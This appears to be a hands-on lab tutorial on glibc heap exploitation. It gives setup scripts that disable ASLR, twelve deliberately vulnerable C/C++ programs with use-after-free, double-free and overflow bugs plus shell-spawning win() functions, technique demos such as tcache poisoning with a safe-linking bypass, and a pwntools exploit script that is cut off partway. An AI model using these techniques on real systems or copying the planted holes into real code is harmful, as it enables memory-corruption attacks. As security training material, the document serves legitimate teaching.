# Tutorial: Heap Exploitation, UAF, and Type Confusion — Hands-On Lab

> **Source document:** `domain3_chapter3B_heap_uaf.md`
> **Scope:** ptmalloc2 internals (malloc_chunk, arenas, bins, tcache), named exploitation techniques (House of Force/Spirit/Lore/Orange/Einherjar/Storm, poison null byte, unsorted bin attack, largebin attack), tcache poisoning and stashing unlink, fastbin dup, UAF and double-free exploitation, heap spray, C++ vtable corruption and type confusion, allocator hardening (safe-linking, jemalloc, PartitionAlloc, Scudo, MTE), FSOP and post-hook-era exploitation, cross-cache kernel heap techniques, browser heap exploitation, detection engineering.
> **Prerequisites:** Chapter 3A lab (stack exploitation), Domain 2 Chapter 2A (process memory), Domain 4 (code reuse — for payload integration).
> **Lab context:** Authorized educational/research environment only.

---

## Lab Environment Setup

### VM Requirements

| VM | Role | OS | RAM | Notes |
|----|------|----|-----|-------|
| VM-ATTACK | Exploit development + analysis | Ubuntu 22.04 (glibc 2.35) | 8 GB | Primary attack workstation |
| VM-LEGACY | Legacy glibc testing | Ubuntu 18.04 (glibc 2.27) | 4 GB | Pre-safe-linking environment |
| VM-DEFENSE | Detection engineering | Ubuntu 24.04 (glibc 2.39) | 4 GB | Latest hardening + monitoring |

### Tool Installation (VM-ATTACK)

```bash
#!/bin/bash
# install_heap_lab.sh — complete heap exploitation lab setup

set -euo pipefail

echo "[*] Installing base dependencies..."
sudo apt-get update
sudo apt-get install -y \
    build-essential gcc g++ gdb git python3 python3-pip python3-venv \
    nasm radare2 ltrace strace linux-tools-common \
    libc6-dbg libstdc++-dev binutils-dev \
    cmake ninja-build pkg-config

echo "[*] Installing GDB extensions..."
# pwndbg
git clone https://github.com/pwndbg/pwndbg.git ~/tools/pwndbg
cd ~/tools/pwndbg && ./setup.sh
cd ~

# GEF (alternative — install but don't activate by default)
git clone https://github.com/hugsy/gef.git ~/tools/gef

echo "[*] Installing Python exploitation tools..."
python3 -m pip install --user pwntools ropper keystone-engine capstone unicorn

echo "[*] Installing heap analysis tools..."
# heap-analysis scripts
pip3 install --user heapinspect 2>/dev/null || true

# ROPgadget
pip3 install --user ROPgadget

# one_gadget
sudo gem install one_gadget 2>/dev/null || {
    echo "[!] Ruby not installed, skipping one_gadget"
}

echo "[*] Installing multiple glibc versions for testing..."
mkdir -p ~/tools/glibc-versions
# Download glibc source for custom builds
for ver in 2.27 2.31 2.35; do
    echo "  [+] Downloading glibc $ver source..."
    wget -q "https://ftp.gnu.org/gnu/glibc/glibc-${ver}.tar.xz" \
         -O ~/tools/glibc-versions/glibc-${ver}.tar.xz 2>/dev/null || true
done

echo "[*] Installing AFL++ for heap fuzzing..."
git clone https://github.com/AFLplusplus/AFLplusplus.git ~/tools/aflpp
cd ~/tools/aflpp && make -j$(nproc) && sudo make install
cd ~

echo "[*] Installing Valgrind..."
sudo apt-get install -y valgrind

echo "[*] Configuring ASLR (disable for initial exercises)..."
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

echo "[+] Lab setup complete."
```

### Vulnerable Programs Compilation Script

```bash
#!/bin/bash
# compile_heap_lab.sh — build all vulnerable binaries for heap exercises

set -euo pipefail

LABDIR="$HOME/heap_lab"
mkdir -p "$LABDIR/bin" "$LABDIR/src"

cd "$LABDIR/src"

#####################################################################
# 1. Basic heap overflow — no mitigations
#####################################################################
cat > heap_overflow_basic.c << 'VULN_EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct record {
    char name[32];
    void (*callback)(const char *);
};

void safe_print(const char *msg) {
    printf("[SAFE] %s\n", msg);
}

void win(const char *msg) {
    printf("[WIN] You hijacked execution! Arg: %s\n", msg);
    system("/bin/sh");
}

int main(void) {
    struct record *r1 = malloc(sizeof(struct record));
    struct record *r2 = malloc(sizeof(struct record));

    r1->callback = safe_print;
    r2->callback = safe_print;
    strcpy(r2->name, "target");

    printf("r1 at %p, r2 at %p\n", r1, r2);
    printf("win() at %p\n", win);
    printf("Enter name for r1 (overflow to corrupt r2): ");
    fflush(stdout);

    /* Vulnerable: no bounds check */
    gets(r1->name);

    printf("Calling r2->callback...\n");
    r2->callback(r2->name);

    free(r1);
    free(r2);
    return 0;
}
VULN_EOF
gcc -o "$LABDIR/bin/heap_overflow_basic" heap_overflow_basic.c \
    -fno-stack-protector -no-pie -z execstack -Wno-deprecated-declarations

#####################################################################
# 2. UAF — function pointer hijack
#####################################################################
cat > uaf_funcptr.c << 'VULN_EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    void (*handler)(const char *msg);
    char name[24];
} plugin_t;

void safe_handler(const char *msg) {
    printf("[plugin] %s\n", msg);
}

void admin_handler(const char *msg) {
    printf("[ADMIN] Executing: %s\n", msg);
    system(msg);
}

plugin_t *plugins[4] = {0};
int plugin_count = 0;

void menu(void) {
    printf("\n1. Create plugin\n2. Delete plugin\n3. Use plugin\n"
           "4. Edit plugin data\n5. Exit\nChoice: ");
    fflush(stdout);
}

int main(void) {
    int choice, idx;
    char buf[256];

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    while (1) {
        menu();
        scanf("%d", &choice);
        getchar();

        switch (choice) {
        case 1:
            if (plugin_count >= 4) { puts("Full"); break; }
            plugins[plugin_count] = malloc(sizeof(plugin_t));
            plugins[plugin_count]->handler = safe_handler;
            printf("Name: ");
            fgets(plugins[plugin_count]->name, 24, stdin);
            printf("Plugin %d created at %p\n", plugin_count,
                   plugins[plugin_count]);
            plugin_count++;
            break;
        case 2:
            printf("Index: ");
            scanf("%d", &idx);
            getchar();
            if (idx < 0 || idx >= plugin_count) { puts("Bad idx"); break; }
            free(plugins[idx]);
            /* BUG: pointer not nulled — dangling reference */
            printf("Plugin %d freed\n", idx);
            break;
        case 3:
            printf("Index: ");
            scanf("%d", &idx);
            getchar();
            if (idx < 0 || idx >= plugin_count) { puts("Bad idx"); break; }
            printf("Message: ");
            fgets(buf, sizeof(buf), stdin);
            /* Uses potentially dangling pointer */
            plugins[idx]->handler(buf);
            break;
        case 4:
            printf("Index: ");
            scanf("%d", &idx);
            getchar();
            if (idx < 0 || idx >= plugin_count) { puts("Bad idx"); break; }
            printf("Data (32 bytes): ");
            /* Writes to potentially freed/reused memory */
            read(0, plugins[idx], 32);
            break;
        case 5:
            return 0;
        }
    }
}
VULN_EOF
gcc -o "$LABDIR/bin/uaf_funcptr" uaf_funcptr.c -no-pie -Wno-deprecated-declarations

#####################################################################
# 3. Double-free (fastbin dup — works on glibc < 2.32)
#####################################################################
cat > double_free.c << 'VULN_EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

uint64_t target_var = 0;

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("target_var at: %p (value: 0x%lx)\n", &target_var, target_var);

    void *chunks[10];
    int count = 0;
    int choice;
    size_t size;
    char buf[256];

    while (1) {
        printf("\n1. Malloc  2. Free  3. Write  4. Show target  5. Exit\nChoice: ");
        scanf("%d", &choice);
        getchar();

        switch (choice) {
        case 1:
            printf("Size: ");
            scanf("%zu", &size);
            getchar();
            if (count >= 10) { puts("Full"); break; }
            chunks[count] = malloc(size);
            printf("chunks[%d] = %p\n", count, chunks[count]);
            count++;
            break;
        case 2: {
            int idx;
            printf("Index: ");
            scanf("%d", &idx);
            getchar();
            if (idx < 0 || idx >= count) { puts("Bad"); break; }
            free(chunks[idx]);
            printf("Freed chunks[%d]\n", idx);
            break;
        }
        case 3: {
            int idx;
            printf("Index: ");
            scanf("%d", &idx);
            getchar();
            if (idx < 0 || idx >= count) { puts("Bad"); break; }
            printf("Data: ");
            fgets(buf, sizeof(buf), stdin);
            memcpy(chunks[idx], buf, strlen(buf));
            break;
        }
        case 4:
            printf("target_var = 0x%lx\n", target_var);
            break;
        case 5:
            return 0;
        }
    }
}
VULN_EOF
gcc -o "$LABDIR/bin/double_free" double_free.c -no-pie

#####################################################################
# 4. Tcache poisoning (pre-safe-linking)
#####################################################################
cat > tcache_poison.c << 'VULN_EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

uint64_t admin_flag = 0;

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("admin_flag at: %p (value: %lu)\n", &admin_flag, admin_flag);

    void *a = malloc(0x20);
    void *b = malloc(0x20);

    printf("a = %p, b = %p\n", a, b);

    free(a);

    printf("After free(a), a's next pointer (first 8 bytes): ");
    printf("0x%lx\n", *(uint64_t *)a);

    printf("Enter new next pointer value (hex): ");
    uint64_t val;
    scanf("%lx", &val);
    *(uint64_t *)a = val;

    void *c = malloc(0x20);
    printf("malloc(0x20) returned: %p\n", c);

    void *d = malloc(0x20);
    printf("malloc(0x20) returned: %p (should be target)\n", d);

    if (d == &admin_flag) {
        printf("Enter new admin_flag value: ");
        scanf("%lu", (uint64_t *)d);
        printf("admin_flag = %lu\n", admin_flag);
    }

    free(b);
    free(c);
    return 0;
}
VULN_EOF
# Compile for glibc < 2.32 (no safe-linking)
gcc -o "$LABDIR/bin/tcache_poison" tcache_poison.c -no-pie

#####################################################################
# 5. Tcache poisoning with safe-linking (glibc 2.32+)
#####################################################################
cat > tcache_poison_safelink.c << 'VULN_EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

uint64_t secret = 0xDEADBEEF;

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("secret at: %p (value: 0x%lx)\n", &secret, secret);

    void *a = malloc(0x20);
    void *guard = malloc(0x20);

    printf("a at: %p\n", a);

    free(a);

    /* Leak: read the encoded NULL from the single-entry tcache bin */
    uint64_t encoded_null = *(uint64_t *)a;
    printf("Encoded next (NULL ^ (addr>>12)): 0x%lx\n", encoded_null);
    printf("Heap page key = 0x%lx\n", encoded_null);

    /* Compute safe-linking encoded target */
    uint64_t target = (uint64_t)&secret;
    uint64_t heap_key = encoded_null; /* addr >> 12 */
    uint64_t forged = target ^ heap_key;

    printf("Forging next pointer: target 0x%lx ^ key 0x%lx = 0x%lx\n",
           target, heap_key, forged);

    /* UAF write: overwrite the encoded next pointer */
    *(uint64_t *)a = forged;

    void *c = malloc(0x20);
    printf("First alloc: %p (reclaims a)\n", c);

    void *d = malloc(0x20);
    printf("Second alloc: %p (should be &secret = %p)\n", d, &secret);

    if (d) {
        *(uint64_t *)d = 0x1337CAFE;
        printf("secret = 0x%lx (should be 0x1337CAFE)\n", secret);
    }

    free(guard);
    free(c);
    return 0;
}
VULN_EOF
gcc -o "$LABDIR/bin/tcache_poison_safelink" tcache_poison_safelink.c -no-pie

#####################################################################
# 6. House of Force
#####################################################################
cat > house_of_force.c << 'VULN_EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);

    uint64_t stack_target = 0;
    printf("stack_target at: %p\n", &stack_target);

    char *a = malloc(0x100);
    printf("a at: %p\n", a);

    /* Simulate heap overflow that corrupts top chunk size */
    size_t *top_size = (size_t *)(a + 0x100 + 0x8);
    printf("Top chunk size before corruption: 0x%lx\n", *top_size);

    printf("Enter new top chunk size (hex): ");
    scanf("%lx", top_size);
    printf("Top chunk size after corruption: 0x%lx\n", *top_size);

    printf("Enter malloc size to advance top (hex, signed offset): ");
    size_t advance_size;
    scanf("%lx", &advance_size);

    void *b = malloc(advance_size);
    printf("Advancing allocation: %p\n", b);

    void *c = malloc(0x100);
    printf("Target allocation: %p (wanted near %p)\n", c, &stack_target);

    printf("Enter value to write to target: ");
    scanf("%lx", (uint64_t *)c);
    printf("stack_target = 0x%lx\n", stack_target);

    return 0;
}
VULN_EOF
# Needs glibc < 2.29 to work; compile without ASLR/PIE
gcc -o "$LABDIR/bin/house_of_force" house_of_force.c -no-pie

#####################################################################
# 7. House of Spirit
#####################################################################
cat > house_of_spirit.c << 'VULN_EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);

    uint64_t secret = 0;
    printf("secret at: %p\n", &secret);

    /* Construct fake chunk on the stack */
    uint64_t fake_chunk[10];
    fake_chunk[0] = 0;       /* prev_size */
    fake_chunk[1] = 0x41;    /* size = 0x40 | PREV_INUSE */
    fake_chunk[2] = 0;       /* fd (will be freelist next) */
    fake_chunk[3] = 0;       /* bk / tcache key */
    /* For fastbin: need valid next-chunk size */
    fake_chunk[8] = 0;       /* next chunk prev_size */
    fake_chunk[9] = 0x41;    /* next chunk size (valid) */

    printf("fake_chunk at %p, user data at %p\n",
           fake_chunk, &fake_chunk[2]);

    /* Simulate a pointer overwrite vulnerability:
       program frees a user-controlled pointer */
    void *fake_ptr = &fake_chunk[2];
    printf("Freeing fake chunk at %p...\n", fake_ptr);
    free(fake_ptr);

    /* Now malloc returns our fake stack chunk */
    void *controlled = malloc(0x30);
    printf("malloc(0x30) returned: %p\n", controlled);
    printf("Is on stack? %s\n",
           ((uint64_t)controlled > (uint64_t)&secret - 0x1000 &&
            (uint64_t)controlled < (uint64_t)&secret + 0x1000)
           ? "YES — arbitrary stack write achieved" : "no");

    return 0;
}
VULN_EOF
gcc -o "$LABDIR/bin/house_of_spirit" house_of_spirit.c -no-pie

#####################################################################
# 8. Off-by-one null byte (poison null byte)
#####################################################################
cat > poison_null_byte.c << 'VULN_EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);

    /* Allocate three chunks */
    void *A = malloc(0xf8);   /* chunk size 0x100 + PREV_INUSE = 0x101 */
    void *B = malloc(0x200);  /* chunk size 0x210 + PREV_INUSE = 0x211 */
    void *C = malloc(0xf8);   /* chunk size 0x100 + PREV_INUSE = 0x101 */
    void *guard = malloc(0x20); /* prevent top-chunk coalescing */

    printf("A: %p  B: %p  C: %p\n", A, B, C);

    size_t B_size = *(size_t *)((char *)B - 8);
    printf("B's size field: 0x%lx\n", B_size);

    /* Free B — it goes into unsorted bin */
    free(B);

    /* Simulate off-by-one null from A's overflow:
       overwrite the LSB of C's size field */
    printf("\n[*] Simulating off-by-one null byte overflow from A...\n");
    size_t *C_size_ptr = (size_t *)((char *)C - 8);
    printf("C's size before: 0x%lx\n", *C_size_ptr);

    /* Null byte clears PREV_INUSE bit */
    *(uint8_t *)C_size_ptr = 0x00;
    printf("C's size after null byte: 0x%lx\n", *C_size_ptr);

    /* Set C's prev_size to span back to B */
    size_t *C_prevsize = (size_t *)((char *)C - 16);
    *C_prevsize = 0x210;
    printf("C's prev_size set to: 0x%lx\n", *C_prevsize);

    /* Free C — triggers backward coalescing with "B" */
    printf("[*] Freeing C — expect coalescing...\n");
    free(C);

    /* The coalesced chunk should overlap B's original region */
    printf("[*] Allocating over the coalesced region...\n");
    void *overlap = malloc(0x300);
    printf("Overlap allocation: %p\n", overlap);

    /* Check if overlap covers A or B region */
    if ((uint64_t)overlap <= (uint64_t)B + 0x200 &&
        (uint64_t)overlap + 0x300 > (uint64_t)B) {
        printf("[+] SUCCESS: Overlapping chunk achieved!\n");
    }

    free(A);
    free(overlap);
    free(guard);
    return 0;
}
VULN_EOF
gcc -o "$LABDIR/bin/poison_null_byte" poison_null_byte.c -no-pie

#####################################################################
# 9. Unsorted bin attack (glibc < 2.29)
#####################################################################
cat > unsorted_bin_attack.c << 'VULN_EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

uint64_t target = 0;

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("target at: %p (value: 0x%lx)\n", &target, target);

    /* Allocate a chunk large enough to avoid tcache */
    void *a = malloc(0x410);
    void *guard = malloc(0x20);

    printf("a at: %p\n", a);

    /* Free into unsorted bin */
    free(a);

    /* Corrupt the bk pointer of the unsorted-bin chunk */
    printf("Enter new bk value (target_addr - 0x10, hex): ");
    uint64_t new_bk;
    scanf("%lx", &new_bk);

    /* The bk field is at offset +0x18 from chunk start = +0x08 from user ptr */
    *((uint64_t *)a + 1) = new_bk;

    /* Trigger: allocate same size — _int_malloc processes unsorted bin */
    void *b = malloc(0x410);
    printf("b at: %p\n", b);

    printf("target value: 0x%lx\n", target);
    if (target != 0) {
        printf("[+] Unsorted bin attack succeeded! "
               "target overwritten with libc address.\n");
    }

    free(b);
    free(guard);
    return 0;
}
VULN_EOF
gcc -o "$LABDIR/bin/unsorted_bin_attack" unsorted_bin_attack.c -no-pie

#####################################################################
# 10. C++ vtable hijack via UAF
#####################################################################
cat > vtable_uaf.cpp << 'VULN_EOF'
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>

class Animal {
public:
    virtual void speak() { printf("...\n"); }
    virtual void info()  { printf("Animal base\n"); }
    virtual ~Animal() {}
    int id;
    char name[24];
};

class Dog : public Animal {
public:
    void speak() override { printf("Woof!\n"); }
    void info() override  { printf("Dog: %s (id=%d)\n", name, id); }
};

class Cat : public Animal {
public:
    void speak() override { printf("Meow!\n"); }
    void info() override  { printf("Cat: %s (id=%d)\n", name, id); }
};

void win() {
    printf("[WIN] Vtable hijacked! Spawning shell...\n");
    system("/bin/sh");
}

Animal *animals[4] = {0};

void menu() {
    printf("\n1. Create Dog  2. Create Cat  3. Delete  "
           "4. Speak  5. Info  6. Write raw  7. Exit\n> ");
    fflush(stdout);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    int choice, idx;
    char buf[64];

    printf("sizeof(Animal/Dog/Cat) = %zu\n", sizeof(Dog));
    printf("win() at %p\n", (void *)win);

    while (true) {
        menu();
        scanf("%d", &choice);
        getchar();

        switch (choice) {
        case 1:
        case 2:
            printf("Index (0-3): ");
            scanf("%d", &idx); getchar();
            if (idx < 0 || idx > 3) break;
            if (choice == 1)
                animals[idx] = new Dog();
            else
                animals[idx] = new Cat();
            printf("Name: ");
            fgets(animals[idx]->name, 24, stdin);
            animals[idx]->id = idx;
            printf("Created at %p, vtable at %p\n",
                   animals[idx], *(void **)animals[idx]);
            break;
        case 3:
            printf("Index: "); scanf("%d", &idx); getchar();
            if (idx < 0 || idx > 3 || !animals[idx]) break;
            delete animals[idx];
            /* BUG: dangling pointer */
            printf("Deleted %d\n", idx);
            break;
        case 4:
            printf("Index: "); scanf("%d", &idx); getchar();
            if (idx < 0 || idx > 3 || !animals[idx]) break;
            animals[idx]->speak();
            break;
        case 5:
            printf("Index: "); scanf("%d", &idx); getchar();
            if (idx < 0 || idx > 3 || !animals[idx]) break;
            animals[idx]->info();
            break;
        case 6:
            printf("Index: "); scanf("%d", &idx); getchar();
            if (idx < 0 || idx > 3) break;
            printf("Raw bytes (%zu): ", sizeof(Dog));
            read(0, animals[idx], sizeof(Dog));
            break;
        case 7:
            return 0;
        }
    }
}
VULN_EOF
g++ -o "$LABDIR/bin/vtable_uaf" vtable_uaf.cpp -no-pie -std=c++17

#####################################################################
# 11. FSOP / _IO_FILE exploitation target
#####################################################################
cat > fsop_target.c << 'VULN_EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void *chunks[16] = {0};
int chunk_count = 0;

void menu(void) {
    printf("\n1. Alloc  2. Free  3. Edit  4. Show  "
           "5. Leak libc  6. Exit\n> ");
    fflush(stdout);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    int choice, idx;
    size_t size;

    printf("This binary has UAF + arbitrary size alloc for FSOP practice\n");
    printf("Compile with target glibc for version-specific chains\n\n");

    while (1) {
        menu();
        scanf("%d", &choice);
        getchar();

        switch (choice) {
        case 1:
            printf("Size: "); scanf("%zu", &size); getchar();
            if (chunk_count >= 16) break;
            chunks[chunk_count] = malloc(size);
            printf("chunks[%d] = %p\n", chunk_count, chunks[chunk_count]);
            chunk_count++;
            break;
        case 2:
            printf("Index: "); scanf("%d", &idx); getchar();
            if (idx < 0 || idx >= chunk_count) break;
            free(chunks[idx]);
            printf("Freed %d\n", idx);
            break;
        case 3:
            printf("Index: "); scanf("%d", &idx); getchar();
            if (idx < 0 || idx >= chunk_count) break;
            printf("Bytes: "); scanf("%zu", &size); getchar();
            printf("Data: ");
            read(0, chunks[idx], size);
            break;
        case 4:
            printf("Index: "); scanf("%d", &idx); getchar();
            if (idx < 0 || idx >= chunk_count) break;
            printf("Data: ");
            for (size_t i = 0; i < 64; i += 8)
                printf("0x%lx ", *(uint64_t *)((char *)chunks[idx] + i));
            printf("\n");
            break;
        case 5:
            /* Leak: free a large chunk into unsorted bin, read fd/bk */
            if (chunk_count >= 16) break;
            {
                void *big = malloc(0x420);
                void *g = malloc(0x20);
                chunks[chunk_count] = big;
                printf("chunks[%d] = %p (large)\n", chunk_count, big);
                chunk_count++;
                free(big);
                /* fd and bk now point to main_arena */
                printf("Leaked fd: 0x%lx\n", *(uint64_t *)big);
                printf("Leaked bk: 0x%lx\n", *((uint64_t *)big + 1));
                free(g);
            }
            break;
        case 6:
            exit(0);
        }
    }
}
VULN_EOF
gcc -o "$LABDIR/bin/fsop_target" fsop_target.c -no-pie

#####################################################################
# 12. Heap spray target (browser-style UAF simulation)
#####################################################################
cat > heap_spray_uaf.c << 'VULN_EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <pthread.h>

typedef struct node {
    uint64_t type_tag;
    void (*process)(struct node *self);
    char data[48];
} node_t;

void node_safe(node_t *self) {
    printf("[node %p] type=%lu data=%s\n", self, self->type_tag, self->data);
}

void node_admin(node_t *self) {
    printf("[ADMIN] Escalated! Executing: %s\n", self->data);
    system(self->data);
}

#define MAX_NODES 256
node_t *nodes[MAX_NODES] = {0};
int ncount = 0;

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    int choice, idx, count;

    printf("sizeof(node_t) = %zu\n", sizeof(node_t));
    printf("node_admin at %p\n", node_admin);

    while (1) {
        printf("\n1. Create  2. Delete  3. Process  4. Spray  5. Exit\n> ");
        scanf("%d", &choice); getchar();

        switch (choice) {
        case 1:
            if (ncount >= MAX_NODES) break;
            nodes[ncount] = malloc(sizeof(node_t));
            nodes[ncount]->type_tag = 1;
            nodes[ncount]->process = node_safe;
            printf("Data: ");
            fgets(nodes[ncount]->data, 48, stdin);
            printf("nodes[%d] = %p\n", ncount, nodes[ncount]);
            ncount++;
            break;
        case 2:
            printf("Index: "); scanf("%d", &idx); getchar();
            if (idx < 0 || idx >= ncount || !nodes[idx]) break;
            free(nodes[idx]);
            /* Dangling pointer retained */
            printf("Freed %d\n", idx);
            break;
        case 3:
            printf("Index: "); scanf("%d", &idx); getchar();
            if (idx < 0 || idx >= ncount || !nodes[idx]) break;
            nodes[idx]->process(nodes[idx]);
            break;
        case 4:
            printf("Count: "); scanf("%d", &count); getchar();
            printf("Fill data (64 bytes): ");
            char fill[64];
            fgets(fill, 64, stdin);
            for (int i = 0; i < count && ncount < MAX_NODES; i++) {
                nodes[ncount] = malloc(sizeof(node_t));
                memcpy(nodes[ncount], fill, sizeof(node_t));
                ncount++;
            }
            printf("Sprayed %d nodes\n", count);
            break;
        case 5:
            return 0;
        }
    }
}
VULN_EOF
gcc -o "$LABDIR/bin/heap_spray_uaf" heap_spray_uaf.c -no-pie -lpthread

echo ""
echo "[+] All binaries compiled in $LABDIR/bin/"
ls -la "$LABDIR/bin/"
```

### Environment Verification

```bash
#!/bin/bash
# verify_heap_lab.sh — verify lab environment

echo "=== Heap Lab Verification ==="

echo -n "glibc version: "
ldd --version 2>&1 | head -1

echo -n "GDB: "
gdb --version 2>&1 | head -1

echo -n "pwndbg: "
gdb -batch -ex 'python import pwndbg; print("OK")' 2>/dev/null || echo "not installed"

echo -n "pwntools: "
python3 -c "import pwn; print(pwn.version)" 2>/dev/null || echo "not installed"

echo -n "ASLR status: "
cat /proc/sys/kernel/randomize_va_space

echo ""
echo "=== Binary protections ==="
for bin in ~/heap_lab/bin/*; do
    echo "--- $(basename $bin) ---"
    checksec --file="$bin" 2>/dev/null || \
        python3 -c "from pwn import *; print(ELF('$bin').checksec())" 2>/dev/null
done
```

---

## PART A: OFFENSIVE (Attack Scenarios)

### Exercise 1: ptmalloc2 Internals — Heap Layout and Chunk Forensics

**Objective:** Master heap chunk layout, bin structures, tcache mechanics, and forensic inspection using GDB.

#### Step 1.1: malloc_chunk structure analysis

```bash
cd ~/heap_lab
cat > src/chunk_inspector.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("=== malloc_chunk Layout Inspector ===\n\n");

    /* Allocate chunks of different sizes */
    void *tiny   = malloc(0x10);  /* min tcache: chunk 0x20 */
    void *small  = malloc(0x30);  /* chunk 0x40 */
    void *medium = malloc(0x80);  /* chunk 0x90 */
    void *large  = malloc(0x400); /* chunk 0x410 — above tcache */
    void *guard  = malloc(0x20);  /* prevent top-chunk merge */

    printf("Allocations:\n");
    printf("  tiny   (%3d) = %p  chunk_header = %p\n", 0x10, tiny,   (char*)tiny-0x10);
    printf("  small  (%3d) = %p  chunk_header = %p\n", 0x30, small,  (char*)small-0x10);
    printf("  medium (%3d) = %p  chunk_header = %p\n", 0x80, medium, (char*)medium-0x10);
    printf("  large  (%3d) = %p  chunk_header = %p\n", 0x400, large, (char*)large-0x10);

    /* Inspect chunk metadata */
    for (struct { void *p; const char *n; } c[] = {
        {tiny,"tiny"}, {small,"small"}, {medium,"medium"}, {large,"large"}, {NULL,NULL}
    }; c->p; c++) {
        uint64_t *hdr = (uint64_t *)((char *)c->p - 0x10);
        printf("\n  %s chunk header at %p:\n", c->n, hdr);
        printf("    prev_size: 0x%lx\n", hdr[0]);
        printf("    size:      0x%lx (actual: 0x%lx, flags: P=%lu M=%lu A=%lu)\n",
               hdr[1], hdr[1] & ~0x7UL,
               hdr[1] & 1, (hdr[1] >> 1) & 1, (hdr[1] >> 2) & 1);
    }

    /* Free into different bins */
    printf("\n=== Freeing chunks ===\n");
    free(tiny);    printf("Freed tiny  → tcache[0x20]\n");
    free(small);   printf("Freed small → tcache[0x40]\n");
    free(medium);  printf("Freed medium → tcache[0x90]\n");
    free(large);   printf("Freed large  → unsorted bin\n");

    /* Inspect free chunk metadata */
    printf("\n=== Free chunk forensics ===\n");

    printf("tiny (tcache) fd/next: 0x%lx\n", *(uint64_t *)tiny);
    printf("tiny (tcache) key:     0x%lx\n", *((uint64_t *)tiny + 1));

    printf("large (unsorted) fd:   0x%lx\n", *(uint64_t *)large);
    printf("large (unsorted) bk:   0x%lx\n", *((uint64_t *)large + 1));

    printf("\nBreakpoint here for GDB inspection.\n");
    getchar();

    free(guard);
    return 0;
}
EOF
gcc -o bin/chunk_inspector src/chunk_inspector.c -no-pie -g
```

#### Step 1.2: GDB heap forensics session

```bash
gdb -q bin/chunk_inspector
```

```gdb
# In GDB with pwndbg:
b *main+300
r

# Heap overview
heap
vis_heap_chunks

# Examine bins
bins

# Tcache state
tcachebins

# Walk main_arena
p main_arena
p main_arena.top
p main_arena.fastbinsY
p &main_arena.bins[0]

# Decode safe-linking pointers (glibc 2.32+)
# For a tcache entry at addr, the stored next = real_next ^ (addr >> 12)
# If next should be NULL: stored = 0 ^ (addr >> 12) = addr >> 12
```

**Expected output (glibc 2.35):**
```
tcachebins
0x20 [  1]: 0x5555555592a0 ◂— 0x0
0x40 [  1]: 0x5555555592c0 ◂— 0x0
0x90 [  1]: 0x555555559300 ◂— 0x0
unsortedbin
all: 0x555555559390 —▸ 0x7ffff7fb8be0 (main_arena+96) ◂— 0x555555559390
```

Key observations:
- Tcache entries store encoded `next` pointers (glibc 2.32+)
- The `key` field at offset +0x08 from user data contains a random value (glibc 2.34+)
- Unsorted bin chunks have `fd`/`bk` pointing to `main_arena` — this is a libc leak vector

#### Step 1.3: Tcache internals deep dive

```python
#!/usr/bin/env python3
"""tcache_forensics.py — Inspect tcache_perthread_struct and safe-linking"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./bin/chunk_inspector')
p = process('./bin/chunk_inspector')

# The tcache_perthread_struct is the first allocation on the heap
# It sits at heap_base + 0x10 (after chunk header)
# Structure: uint16_t counts[64] + tcache_entry *entries[64]

# Attach GDB for manual inspection
gdb.attach(p, '''
# Examine tcache_perthread_struct
set $tcache = (struct tcache_perthread_struct *)($heap_base + 0x10)

# Dump tcache counts (first 128 bytes = 64 x uint16_t)
x/64hx $heap_base + 0x10

# Dump tcache entry pointers (next 512 bytes = 64 x 8-byte pointers)
x/64gx $heap_base + 0x10 + 0x80

# Safe-linking decode helper
define decode_ptr
    set $pos = $arg0
    set $encoded = *(unsigned long *)$pos
    set $key = $pos >> 12
    set $decoded = $encoded ^ $key
    printf "Encoded: 0x%lx, Key: 0x%lx, Decoded: 0x%lx\\n", $encoded, $key, $decoded
end

# Example: decode first tcache entry
# decode_ptr <address_of_tcache_entry>
''')

p.interactive()
```

---

### Exercise 2: Basic Heap Overflow — Function Pointer Hijack

**Objective:** Exploit adjacent heap chunks via linear overflow to corrupt a function pointer.

#### Step 2.1: Analyze the heap layout

```python
#!/usr/bin/env python3
"""heap_overflow_exploit.py — Heap overflow to function pointer hijack"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./bin/heap_overflow_basic')
p = process('./bin/heap_overflow_basic')

# Parse leaked addresses
p.recvuntil(b'r1 at ')
r1 = int(p.recvuntil(b',')[:-1], 16)
p.recvuntil(b'r2 at ')
r2 = int(p.recvline().strip(), 16)
p.recvuntil(b'win() at ')
win_addr = int(p.recvline().strip(), 16)

log.info(f"r1 = {hex(r1)}")
log.info(f"r2 = {hex(r2)}")
log.info(f"win = {hex(win_addr)}")

# Calculate offset from r1->name to r2->callback
# struct record { char name[32]; void (*callback)(); }
# sizeof(struct record) = 40 bytes
